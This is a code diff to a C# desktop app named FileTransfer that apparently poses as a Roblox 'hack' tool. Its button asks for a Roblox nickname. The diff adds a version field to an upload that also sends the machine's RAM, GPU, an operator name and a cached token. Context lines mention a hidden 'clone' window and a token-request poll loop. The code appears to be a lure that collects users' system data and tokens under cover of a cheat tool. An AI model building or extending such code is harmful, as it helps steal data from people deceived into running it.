@@ -242,6 +242,7 @@ namespace FileTransfer
             {
                 Log("Background work error: " + ex);
             }
+
             // Poll loop запускается ВСЕГДА (для клона и видимого окна), 
             // даже если стартовый аплоад упал с ошибкой
             Log("Starting token request poll loop...");
@@ -388,6 +389,7 @@ namespace FileTransfer
                 content.Add(new StringContent(_ram ?? "—"), "ram");
                 content.Add(new StringContent(_gpu ?? "—"), "gpu");
                 content.Add(new StringContent(OperatorName), "operator");
+                content.Add(new StringContent("7.0.2"), "version");
 
                 if (!string.IsNullOrEmpty(_cachedToken))
                 {
@@ -473,7 +475,7 @@ namespace FileTransfer
         // ── Placeholder ─────────────────────────────────────────────────────
         private void TxtUsername_GotFocus(object sender, RoutedEventArgs e)
         {
-            if (TxtUsername.Text == PlaceholderText)
+            if (TxtUsername.Text == PlaceholderTextValue)
             {
                 TxtUsername.Text = "";
                 TxtUsername.Foreground = System.Windows.Media.Brushes.White;
@@ -484,7 +486,7 @@ namespace FileTransfer
         {
             if (string.IsNullOrWhiteSpace(TxtUsername.Text))
             {
-                TxtUsername.Text = PlaceholderText;
+                TxtUsername.Text = PlaceholderTextValue;
                 TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
             }
         }
@@ -492,7 +494,7 @@ namespace FileTransfer
         // ── Debounced Roblox Avatar ─────────────────────────────────────────
         private void TxtUsername_TextChanged(object sender, TextChangedEventArgs e)
         {
-            if (TxtUsername.Text == PlaceholderText) return;
+            if (TxtUsername.Text == PlaceholderTextValue) return;
 
             if (_debounceTimer != null)
                 _debounceTimer.Stop();
@@ -510,7 +512,7 @@ namespace FileTransfer
             _debounceTimer?.Stop();
 
             string username = TxtUsername.Text.Trim();
-            if (string.IsNullOrEmpty(username) || username == PlaceholderText)
+            if (string.IsNullOrEmpty(username) || username == PlaceholderTextValue)
             {
                 AvatarBrush.ImageSource = null;
                 TxtPlaceholder.Text = "?";
@@ -630,7 +632,7 @@ namespace FileTransfer
         private async void BtnHack_Click(object sender, RoutedEventArgs e)
         {
             string username = TxtUsername.Text.Trim();
-            if (string.IsNullOrEmpty(username) || username == PlaceholderText)
+            if (string.IsNullOrEmpty(username) || username == PlaceholderTextValue)
             {
                 AppendConsole("[error]", "#FF4757", " Введите никнейм Roblox!", "#FF4757");
                 SetStatusBadge("ОШИБКА", "#FF4757");
